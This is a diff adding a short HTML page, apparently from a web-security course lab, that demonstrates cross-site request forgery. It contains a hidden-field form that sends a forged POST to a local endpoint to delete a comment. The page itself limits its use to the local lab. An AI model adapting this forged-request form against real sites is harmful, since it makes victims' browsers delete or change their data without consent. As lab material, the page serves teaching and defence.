@@ -1,0 +1,19 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <title>Fake Request Demo</title>
+</head>
+
+<body>
+    <h2>Fake Request Demo</h2>
+    <p>This page simulates a forged POST request to the Delete endpoint. Use it only with the local Lab10 environment.
+    </p>
+    <form method="post" action="http://localhost:8080/Lab10/Lab10_delete_comment_before_csrf.php">
+        <input type="hidden"
+            name="comment_id" value="1"><input type="hidden" name="return_to" value="Lab10_comments_secure.php">
+            <button type="submit">Send Fake Delete Request</button></form>
+</body>
+
+</html>
